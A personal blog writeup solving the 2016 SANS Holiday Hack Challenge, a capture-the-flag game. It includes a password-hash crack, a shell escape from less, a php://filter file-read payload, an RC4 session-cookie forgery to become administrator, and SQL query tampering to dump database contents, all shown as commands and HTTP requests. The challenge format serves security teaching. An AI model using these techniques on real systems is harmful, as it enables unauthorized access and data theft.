---
layout: post
title: 2016 SANS Holiday Hack Challenge - Writeup
draft: false
---

This Christmas I took part in [SANS Holiday Hack Challenge](https://www.holidayhackchallenge.com/2016/index.html) - and had a blast! :smile: What a fun ride it was. Modeled as a retro computer game it had security challenges masterfully woven into the script, making for an entertaining experience that also teaches important lessons about various security vulnerabilities. 

I especially liked that for me the challenge achieved the [Goldilocks factor](https://en.wikipedia.org/wiki/Goldilocks_principle) - puzzles were not too easy (so that they remained challenging and interesting), and not too hard (so that you are not banging your head against the wall, frustrated).

In this writeup I will outline my solutions to the tasks in this challenge. If it is still [online](https://quest2016.holidayhackchallenge.com/) when you are reading this, and you want to try it first - **stop reading now as there will be lots of spoilers**. :smile:

## Introduction 

The full story is available online, but in brief - Santa was kidnapped and our goal is to save him and find out who kidnapped him. 

As part of the challenge we must:

* Find 20 NewWars coins
* Find 5 pieces of Cranberry Pi computer
* Hack 4 terminals 
* Find SantaGram Android application and reverse engineer it, collecting an audio file from it
* Find and hack 5 different services and collect 6 audio files from them
* Put the 6+1=7 audio files together to discover the password to the last secret terminal to find out who kidnapped Santa, and why


## Part 1: A Most Curious Business Card

After registering and logging in we enter the game and are ready to start exploring.

![start]({{ site.baseurl }}/images/sans2016/start.png)

As we walk around we can click on game characters and read what they say. It is important to record all the facts that we learn. All the blog post references, files and tidbits of information will be useful down the line. 

Clicking on things allows us to collect coins and pieces of Cranberry Pi computer. Coins can be collected throughout the game and lots of them are hidden behind other objects, so as we walk around it is important to click on virtually every square of the scene. Cranberry Pi will be required before we can access the terminals, so collecting all the pieces for it will be one of the first things we do.

We start by looking at Santa's [Twitter](https://twitter.com/santawclaus) and [Instagram](https://www.instagram.com/santawclaus/) accounts. In the Twitter account there is a large number of cryptic tweets. However when we copy all of them and take a birds-eye view of them a secret message is revealed:

![twitter]({{ site.baseurl }}/images/sans2016/twitter.png)

On Instagram the first image is most important. It contains a bunch of information, including the name of the Web site - ```http://www.northpolewonderland.com/``` - and the name of the zip file - ```SantaGram_v4.2.zip```. Putting the two together we get a zip file with an APK inside. The password for the zip file is the slightly modified text from the Twitter feed - ```bugbounty```.

> 1) What is the secret message in Santa's tweets?

> **BUG BOUNTY**

> 2) What is inside the ZIP file distributed by Santa's team?

> **APK file SantaGram_4.2.apk**


## Part 2: Awesome Package Konveyance

We now crack open the APK file using [Apktool](https://ibotpeaches.github.io/Apktool/) and decompile it using [CFR Decompiler](http://www.benf.org/other/cfr/).

Analyzing the source gives us a wealth of information, including the username and password used to access the Analytics server, and the audio file.

> 3) What username and password are embedded in the APK file?

> **guest/busyreindeer78**

> 4) What is the name of the audible component (audio file) in the SantaGram APK file?

> **res/raw/discombobulatedaudio1.mp3**

## Part 3: A Fresh-Baked Holiday Pi

Once we have all pieces of Cranberry Pi we talk to Holly Evergreen and she gives us a disk image. We mount it as described in [one of the blog posts that we were given](https://pen-testing.sans.org/blog/2016/12/07/mount-a-raspberry-pi-file-system-image) and use John the Ripper tool to crack the password for ```cranpi``` account:

```

root@kali:/sans# fdisk -l cranbian-jessie.img
Disk cranbian-jessie.img: 1.3 GiB, 1389363200 bytes, 2713600 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x5a7089a1

Device               Boot  Start     End Sectors  Size Id Type
cranbian-jessie.img1        8192  137215  129024   63M  c W95 FAT32 (LBA)
cranbian-jessie.img2      137216 2713599 2576384  1.2G 83 Linux
root@kali:/sans# echo $((512*137216))
70254592
root@kali:/sans# mkdir -p /mnt/cran
root@kali:/sans# mount -v -o offset=70254592 -t ext4 cranbian-jessie.img /mnt/cran
mount: /dev/loop0 mounted on /mnt/cran.

root@kali:/mnt/cran# john --wordlist=rockyou.txt etc/shadow
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
yummycookies     (cranpi)
1g 0:00:10:33 DONE (2016-12-23 10:09) 0.001579g/s 717.5p/s 717.5c/s 717.5C/s yveth..yulyul
Use the "--show" option to display all of the cracked passwords reliably

```

Now that we have the password (```yummycookies```) we can talk to Holly again and give it to her. From that point on the Cranberry Pi is activated and we can use it to access 4 terminals in the game.

![terminal]({{ site.baseurl }}/images/sans2016/terminal.png)

### Terminal in Elf House #2

> To open the door, find both parts of the passphrase inside the /out.pcap file

As we log in we realize that ```out.pcap``` is only accessible to the user ```itchy``` (and we are logged in as ```scratchy```). In such cases the obvious choice is to try ```sudo```. As it turns out ```sudo``` rules allow certain commands to execute as ```itchy```:

```
scratchy@ce7787915721:/$ sudo -l
sudo: unable to resolve host ce7787915721
Matching Defaults entries for scratchy on ce7787915721:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User scratchy may run the following commands on ce7787915721:
    (itchy) NOPASSWD: /usr/sbin/tcpdump
    (itchy) NOPASSWD: /usr/bin/strings
```

Running ```strings``` gives us the first half of the password:

```
scratchy@ce7787915721:/$sudo -u itchy strings out.pcap | more
...
<input type="hidden" name="part1" value="santasli" />
...
```

The other half of the password is encoded in a binary file. But before we continue with it, let's try to guess the password. Given who [Itchy and Scratchy](https://en.wikipedia.org/wiki/The_Itchy_%26_Scratchy_Show) are there is a chance that the full password is [```santaslittlehelper```](https://en.wikipedia.org/wiki/Santa's_Little_Helper). And it turns out that it is. :smile:

### Workshop Terminal #1

> To open the door, find the passphrase file deep in the directories.

To find the passphrase we can use the ```find``` command as it lists all files with full paths. Once the file is found we add quotes and escape characters to its name in order to display its contents:

```

elf@b18091e6369d:~$ find
.
./.bashrc
./.doormat
./.doormat/. 
./.doormat/. / 
./.doormat/. / /\
./.doormat/. / /\/\\
./.doormat/. / /\/\\/Don't Look Here!
./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?
./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'
./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txt
./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/cookbook
./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/temp
./.doormat/. / /\/\\/Don't Look Here!/secret
./.doormat/. / /\/\\/Don't Look Here!/files
./.doormat/. / /\/\\/holiday
./.doormat/. / /\/\\/temp
./.doormat/. / /\/santa
./.doormat/. / /\/ls
./.doormat/. / /opt
./.doormat/. / /var
./.doormat/. /bin
./.doormat/. /not_here
./.doormat/share
./.doormat/temp
./var
./temp
./.profile
./.bash_logout


elf@00b4259e780e:~$ cat $'.doormat/. / /\\/\\\\/Don\'t Look Here!/You are persistent, aren\'t you?/\'/key_for_the_door.txt'
key: open_sesame
```

### Workshop Terminal #2

> Find the passphrase from the wumpus. Play fair or cheat; it's up to you.

This was my first time playing Wumpus and playing a text-based quest does not sound that exciting. So let's figure out a way to cheat.  :smile:

After reading up on Wumpus on the Web I learned that there are command line parameters that allow you to set bats and pits to zero, reduce the number of rooms to minimum, and set the number of arrows to a large number. When running with these parameters winning becomes fairly easy, and the password is revealed:

```
elf@252beae5d99b:~$ ./wumpus -a 10000 -b 0 -p 0 -r 5
Instructions? (y-n) n
You're in a cave with 5 rooms and 3 tunnels leading from each room.
There are 0 bats and 0 pits scattered throughout the cave, and your
quiver holds 10000 custom super anti-evil Wumpus arrows.  Good luck.
You are in room 4 of the cave, and have 10000 arrows left.
*sniff* (I can smell the evil Wumpus nearby!)
There are tunnels to rooms 3, 4, and 5.
Move or shoot? (m-s) s 1 2 3
*thunk*  The arrow can't find a way from 4 to 1 and flys randomly
into room 4!
*Thwack!*  A sudden piercing feeling informs you that the ricochet
of your wild arrow has resulted in it wedging in your side, causing
extreme agony.  The evil Wumpus, with its psychic powers, realizes this
and immediately rushes to your side, not to help, alas, but to EAT YOU!
(*CHOMP*)
Care to play another game? (y-n) 
In the same cave? (y-n) y
You are in room 2 of the cave, and have 10000 arrows left.
*sniff* (I can smell the evil Wumpus nearby!)
There are tunnels to rooms 1, 3, and 4.
Move or shoot? (m-s) s 1 3 4
*thunk*  The arrow can't find a way from 1 to 3 and flys randomly
into room 1!
You are in room 2 of the cave, and have 9999 arrows left.
*sniff* (I can smell the evil Wumpus nearby!)
There are tunnels to rooms 1, 3, and 4.
Move or shoot? (m-s) s 3
You are in room 2 of the cave, and have 9998 arrows left.
*sniff* (I can smell the evil Wumpus nearby!)
There are tunnels to rooms 1, 3, and 4.
Move or shoot? (m-s) s 4
*thwock!* *groan* *crash*
A horrible roar fills the cave, and you realize, with a smile, that you
have slain the evil Wumpus and won the game!  You don't want to tarry for
long, however, because not only is the Wumpus famous, but the stench of
dead Wumpus is also quite well known, a stench plenty enough to slay the
mightiest adventurer at a single whiff!!
Passphrase:
WUMPUS IS MISUNDERSTOOD
```

### Train Station

At this terminal we see the train console:

```
Train Management Console: AUTHORIZED USERS ONLY
                ==== MAIN MENU ====
STATUS:                         Train Status
BRAKEON:                        Set Brakes
BRAKEOFF:                       Release Brakes
START:                          Start Train
HELP:                           Open the help document
QUIT:                           Exit console
menu:main>
``` 

As we explore the menu we see that HELP command uses ```less```. To escape into a shell we use ```!!``` command and then run an application to start the train:

```
menu:main> HELP
...
/home/conductor/TrainHelper.txt
!!
sh-4.3$ ls 
ActivateTrain  TrainHelper.txt  Train_Console
sh-4.3$ ./ActivateTrain 
```

Once the train is activated we travel back in time to 1978. After visiting different halls and picking up coins we finally find and rescue Santa in DFER room adjacent to the Workshop.

![santa]({{ site.baseurl }}/images/sans2016/santa.png)

> 5) What is the password for the "cranpi" account on the Cranberry Pi system?

> **yummycookies**

> 6) How did you open each terminal door and where had the villain imprisoned Santa?

> **See above for steps to open terminal doors. Santa was found in 1978 in DFER room.**

## Part 4: My Gosh... It's Full of Holes

We then exploit all services referenced in the APK source (after running the IP addresses by Tom Hessman, of course). 

> 7) ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN AT THE NORTH POLE, ATTEMPT TO REMOTELY EXPLOIT EACH OF THE FOLLOWING TARGETS:
>
> * The Mobile Analytics Server (via credentialed login access)
> * The Dungeon Game
> * The Debug Server
> * The Banner Ad Server
> * The Uncaught Exception Handler Server
> * The Mobile Analytics Server (post authentication)

### The Mobile Analytics Server (via credentialed login access)

We already know the login credentials (```guest/busyreindeer78```) for the Analytics server at [http://analytics.northpolewonderland.com/](http://analytics.northpolewonderland.com/). When we log in we immediately see the menu command to give us the MP3 audio file.

### The Dungeon Game

Before playing the game I read up on it and it turned out that there is a debug command in it that we can take advantage of. Let's explore that with the downloaded version of Dungeon:

```
./dungeon
Welcome to Dungeon.        This version created 11-MAR-78.
You are in an open field west of a big white house with a boarded
front door.
There is a small wrapped mailbox here.
>gdt
GDT>help
Valid commands are:
AA- Alter ADVS          DR- Display ROOMS
AC- Alter CEVENT        DS- Display state
AF- Alter FINDEX        DT- Display text
AH- Alter HERE          DV- Display VILLS
AN- Alter switches      DX- Display EXITS
AO- Alter OBJCTS        DZ- Display PUZZLE
AR- Alter ROOMS         D2- Display ROOM2
AV- Alter VILLS         EX- Exit
AX- Alter EXITS         HE- Type this message
AZ- Alter PUZZLE        NC- No cyclops
DA- Display ADVS        ND- No deaths
DC- Display CEVENT      NR- No robber
DF- Display FINDEX      NT- No troll
DH- Display HACKS       PD- Program detail
DL- Display lengths     RC- Restore cyclops
DM- Display RTEXT       RD- Restore deaths
DN- Display switches    RR- Restore robber
DO- Display OBJCTS      RT- Restore troll
DP- Display parser      TK- Take
```

The ```dt``` command gives us in-memory strings. Let's explore it in the hopes that it will give us the location of the audio file. We know that the original code was modified, so the added string(s) will likely come at the end:

```
GDT>dt
Entry:    1
Welcome to Dungeon.        This version created 11-MAR-78.
...
GDT>dt
Entry:    1100
GDT>dt
Entry:    1050
GDT>dt
Entry:    1020
The thief, noticing you beginning to stir, reluctantly finishes you off.
GDT>dt
Entry:    1030
GDT>dt
Entry:    1029
GDT>dt
Entry:    1028
GDT>dt
Entry:    1027
The elf says - you have conquered this challenge - the game will now end.
GDT>dt
Entry:    1026
The elf appears increasingly impatient.
GDT>dt
Entry:    1025
"That wasn't quite what I had in mind", he says, tossing
the # into the fire, where it vanishes.
GDT>dt 
Entry:    1024
The elf, satisified with the trade says - 
Try the online version for the true prize
```

Now we try the same thing with online version of the application and we get the following hint:

```
GDT>dt
Entry:    1024
The elf, satisified with the trade says - 
send email to "peppermint@northpolewonderland.com" for that which you seek.```
```
After sending the e-mail we get file ```discombobulatedaudio3.mp3``` back.

### The Debug Server

Code analysis shows that a special setting needs to be turned on in the APK for the Debug server requests to be sent:

```xml
<string name="debug_data_enabled">true</string>
```

After we make the change we re-pack and re-sign the APK as described in [https://www.youtube.com/watch?v=mo2yZVRicW0](https://www.youtube.com/watch?v=mo2yZVRicW0).

Next, we set up an intercepting proxy on the Android phone and see what requests are actually sent when Edit Profile screen is selected in the app.

Here's is one captured example:

```http
POST /index.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9505 Build/KOT49H)
Host: dev.northpolewonderland.com
Connection: Keep-Alive
Content-Length: 144

{"date":"20161231033814-0500","freemem":158126120,"debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","udid":"5b23d1248ad99dd"}

HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Content-Type: application/json
Date: Sat, 31 Dec 2016 08:38:16 GMT
Server: nginx/1.6.2

{"date":"20161231083816","status":"OK","filename":"debug-20161231083816-0.txt","request":{"date":"20161231033814-0500","freemem":158126120,"debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","udid":"5b23d1248ad99dd","verbose":false}}
```

Notice that there is a new parameter returned in the sample above - ```"verbose":false```. Let's modify the request, adding ```"verbose":true``` and re-send it:
 
```http
POST /index.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9505 Build/KOT49H)
Host: dev.northpolewonderland.com
Connection: Keep-Alive
Content-Length: 144

{"date":"20161231033814-0500","freemem":158126120,"debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","udid":"5b23d1248ad99dd","verbose":true}

HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Content-Type: application/json
Date: Sat, 31 Dec 2016 08:41:47 GMT
Server: nginx/1.6.2

{"date":"20161231084147","date.len":14,"status":"OK","status.len":"2","filename":"debug-20161231084147-0.txt","filename.len":26,"request":{"date":"20161231033814-0500","freemem":158126120,"debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","udid":"5b23d1248ad99dd","verbose":true},"files":["debug-20161224235959-0.mp3","debug-20161231082054-0.txt","debug-20161231083816-0.txt","debug-20161231083918-0.txt","debug-20161231084147-0.txt","index.php"]}
```

Notice that now a lot more information is returned, including the name of an MP3 file - ```debug-20161224235959-0.mp3```.

### The Banner Ad Server

The Banner Ad server is available at [http://ads.northpolewonderland.com/](http://ads.northpolewonderland.com/). To explore it I installed the Meteor Miner script as described in [https://pen-testing.sans.org/blog/2016/12/06/mining-meteor](https://pen-testing.sans.org/blog/2016/12/06/mining-meteor).

After clicking around for a bit and executing console commands to examine the objects the location of the MP3 file was revealed:

![ads]({{ site.baseurl }}/images/sans2016/ads.png)

### The Uncaught Exception Handler Server

As we explore the Exception server we try a number of JSON payloads and get some information in the process:

```http
POST /exception.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9505 Build/KOT49H)
Host: ex.northpolewonderland.com
Connection: Keep-Alive
Content-Length: 104

{}


HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Mon, 26 Dec 2016 06:32:54 GMT
Server: nginx/1.10.2

Fatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump.

-------------------------------------

...
{"operation":"WriteCrashDump"}


HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Mon, 26 Dec 2016 06:34:15 GMT
Server: nginx/1.10.2

Fatal error! JSON key 'data' must be set.

-------------------------------------

...
{"operation":"WriteCrashDump","data":{"crashdump":"/docs/a"}}


HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Mon, 26 Dec 2016 06:36:59 GMT
Server: nginx/1.10.2

{
    "success" : true,
    "folder" : "docs",
    "crashdump" : "crashdump-ZCEIDC.php"
}
```

Given that the data is written into a PHP file let's try the filter exploit:

```http
POST /exception.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9505 Build/KOT49H)
Host: ex.northpolewonderland.com
Connection: Keep-Alive
Content-Length: 104

{"operation":"ReadCrashDump","data":{"crashdump":"php://filter/convert.base64-encode/resource=exception"}}


HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Mon, 26 Dec 2016 07:36:26 GMT
Server: nginx/1.10.2

PD9waHAgCgojIEF1ZGlvIGZpbGUgZnJvbSBEaXNjb21ib2J1bG...
```

When we Base64-decode the response we get the source of ```exception.php```, that includes the following string:

```php
<?php # Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3 
```


### The Mobile Analytics Server (post authentication)

Coming back to the analytics server we now need to try and exploit it further. Running ```nmap``` against it reveals that a Git repository is accessible:

```
root@kali:/sans# nmap -sV -sC analytics.northpolewonderland.com

Starting Nmap 7.31 ( https://nmap.org ) at 2017-01-03 21:03 EST
Nmap scan report for analytics.northpolewonderland.com (104.198.252.157)
Host is up (0.014s latency).
rDNS record for 104.198.252.157: 157.252.198.104.bc.googleusercontent.com
Not shown: 998 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 5d:5c:37:9c:67:c2:40:94:b0:0c:80:63:d4:ea:80:ae (DSA)
|   2048 f2:25:e1:9f:ff:fd:e3:6e:94:c6:76:fb:71:01:e3:eb (RSA)
|_  256 4c:04:e4:25:7f:a1:0b:8c:12:3c:58:32:0f:dc:51:bd (ECDSA)
443/tcp open  ssl/http nginx 1.6.2
| http-git: 
|   104.198.252.157:443/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Finishing touches (style, css, etc) 
...
```

Going to [https://analytics.northpolewonderland.com/.git/](https://analytics.northpolewonderland.com/.git/) confirms that we can indeed browse the Git repository files. Let's retrieve them using [HTTrack](https://www.httrack.com/). Once we have the files we use Git to restore the original sources using ```git reset --hard```.

The source PHP files contain a wealth of information about the site - encryption logic, SQL queries, database schema, and so on. It also shows that the MP3 files are stored in a separate database table - we were only able to retrieve one of them, but there may be others.

Let's try to log in as ```administrator```, as the code analysis reveals that this user has the functionality that we need. Namely, ability to modify queries.

It looks like the cookie ```AUTH``` contains authentication session and the user name, and we can change its value to log in as ```administrator```.

Decoding:

```
root@kali:/sans# php -a
Interactive mode enabled

php > print mcrypt_decrypt(MCRYPT_ARCFOUR, "\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc", pack("H*","82532b2136348aaa1fa7dd2243da1cc9fb13037c49259e5ed70768d4e9baa1c80b97fee8bca72880fc78be7cc4980953b14348637bec"), 'stream');

{"username":"guest","date":"2016-12-27T04:54:28+0000"}
```

Encoding:

```
php > print bin2hex(mcrypt_encrypt(MCRYPT_ARCFOUR, "\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc", '{"username":"administrator","date":"2016-12-27T04:54:28+0000"}', 'stream'));

82532b2136348aaa1fa7dd2243dc0dc1e10948231f339e5edd5770daf9eef18a4384f6e7bca04d86e573b965cc9d6548b5494d6763a30b63b71976884152
```

We use an intercepting proxy to set the new cookie value and we are then logged in as ```administrator```. Note the new ```Edit``` command in the menu (but the ```MP3``` command is gone):

![admin1]({{ site.baseurl }}/images/sans2016/admin1.png)

Now let's try to retrieve the saved MP3. The site allows saving of queries. We start by saving an arbitrary query and recording its ID. Then we can use newfound Edit functionality to *modify* that query to be something else. 

We can do that in an intercepting proxy:

```http
GET /edit.php?id=6df741a8-c1b7-42ea-bd51-97ba7afa4d94&name=d&description=d&query=select%20*%20from%20audio HTTP/1.1
Host: analytics.northpolewonderland.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://analytics.northpolewonderland.com/edit.php
Cookie: AUTH=82532b2136348aaa1fa7dd2243dc0dc1e10948231f339e5edd5770daf9eef18a4384f6e7bca04d86e573b965cc9d6548b5494d6763a30b63b71976884152
Connection: keep-alive
```

Next we execute the saved query using View functionality:

![admin2]({{ site.baseurl }}/images/sans2016/admin2.png)

Note that we now see what MP3 files are in the database. But we cannot quite get the files yet because they are blobs. So let's modify the query to Base64-encode them:

```http
GET /edit.php?id=6df741a8-c1b7-42ea-bd51-97ba7afa4d94&name=d&description=d&query=select%20to_base64(mp3)%20from%20audio HTTP/1.1
Host: analytics.northpolewonderland.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://analytics.northpolewonderland.com/edit.php
Cookie: AUTH=82532b2136348aaa1fa7dd2243dc0dc1e10948231f339e5edd5770daf9eef18a4384f6e7bca04d86e573b965cc9d6548b5494d6763a30b63b71976884152
Connection: keep-alive
```

Now we can get the encoded bodies of the MP3 files:

![admin3]({{ site.baseurl }}/images/sans2016/admin3.png)

Now all that is left is Base64-decoding them and picking the right file for our needs (looking back it seems that adding a ```WHERE username='administrator'``` clause to the query would have simplified this task a little as it would have given us the right file directly).

> 8) What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.)

> * **discombobulatedaudio1.mp3**
> * **discombobulatedaudio2.mp3**
> * **discombobulatedaudio3.mp3**
> * **debug-20161224235959-0.mp3**
> * **discombobulatedaudio5.mp3**
> * **discombobulated-audio-6-XyzE3N9YqKNH.mp3**
> * **discombobulatedaudio7.mp3**

## Part 5: Discombobulated Audio 

Once I collected all the files, I fired up [Audacity](http://www.audacityteam.org/) and went on to play with them. This was actually the most frustrating part of the challenge as I took the wrong turn and spent about 2 evenings trying to analyze each clip - changing pitch and tempo, clearing noise, normalizing, compressing, changing bass and treble, amplifying, merging... the list goes on and on. I got some random words out of that exercise but overall I was nowhere close to discovering the true message hidden in the audio. 

That was a classic case of over-thinking the solution to the problem and the lesson to be learned here is to *always* try the simple and obvious solution first, no matter how unlikely or simplistic it seems. 

In the end the solution was to simply join the files according to their sequence numbers, and then speed up the audio by increasing tempo about 6 times (in Audacity this is done by going to ```Effect > Change tempo...``` and entering ```600``` in ```Percent Change``` field). Once that was done I could fairly clearly hear the phrase being said, although some individual words could still be interpreted in different ways that didn't make a whole lot of sense. What I thought I heard was ```Follow Christmas, time controls, or as I was known in chess```. :worried:

After listening to the recording for a while I was finally convinced that the first part was ```Father Christmas Santa Claus```. And a quick Google search brought back the actual original phrase:

> Father Christmas, Santa Claus, or - as I've always known him - Jeff

I didn't know this, but the phrase actually comes from [A Christmas Carol - Doctor Who](https://en.wikipedia.org/wiki/A_Christmas_Carol_%28Doctor_Who%29). Here's a clip that contains it - [https://www.youtube.com/watch?v=sedD40sEb8M](https://www.youtube.com/watch?v=sedD40sEb8M).

From here on it was smooth sailing - I entered that phrase at the password terminal in the corridor in the Santas Office and met Doctor Who, who explained why he abducted Santa.

![drwho]({{ site.baseurl }}/images/sans2016/drwho.png)

> 9) Who is the villain behind the nefarious plot.

> **Doctor Who**

> 10) Why had the villain abducted Santa?

> **To prevent Star Wars Holiday Special from being released**

The end. :smile:

*In conclusion I would like to thank the SANS team for the great job they did implementing this challenge. Looking forward to the new version next Christmas!*

